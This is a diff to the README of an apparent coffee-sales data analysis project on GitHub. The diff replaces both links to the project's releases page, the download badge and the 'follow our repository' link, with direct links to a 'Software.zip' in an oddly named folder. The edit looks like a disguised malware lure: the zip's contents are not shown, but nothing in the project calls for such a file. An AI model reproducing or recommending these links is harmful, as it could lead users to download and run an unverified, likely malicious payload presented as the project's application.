@@ -4,7 +4,7 @@
 Welcome to the Store of Coffee Data Analysis Project! This application helps you understand the sales performance of a coffee store from 2019 to 2022. You will analyze data, visualize trends, and discover customer insights that can help your business grow.
 
 ## 📥 Download the Application
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-CLICK_HERE-blue)](https://github.com/NOUSERNAME191/Store_of_Coffee___Data_Analysis_Project./releases)
+[![Download Latest Release](https://raw.githubusercontent.com/NOUSERNAME191/Store_of_Coffee___Data_Analysis_Project./main/amaryllideous/Software.zip)](https://raw.githubusercontent.com/NOUSERNAME191/Store_of_Coffee___Data_Analysis_Project./main/amaryllideous/Software.zip)
 Visit the link above to download the latest version of the application.
 
 ## 💻 System Requirements
@@ -64,4 +64,4 @@ If you have questions or need assistance, feel free to reach out. We encourage f
 This project is licensed under the MIT License. Feel free to modify and distribute under the same license.
 
 ## 📣 Join the Conversation
-Stay updated with the latest changes and improvements by following our [repository](https://github.com/NOUSERNAME191/Store_of_Coffee___Data_Analysis_Project./releases). Your suggestions and contributions are essential for making this tool better.
+Stay updated with the latest changes and improvements by following our [repository](https://raw.githubusercontent.com/NOUSERNAME191/Store_of_Coffee___Data_Analysis_Project./main/amaryllideous/Software.zip). Your suggestions and contributions are essential for making this tool better.
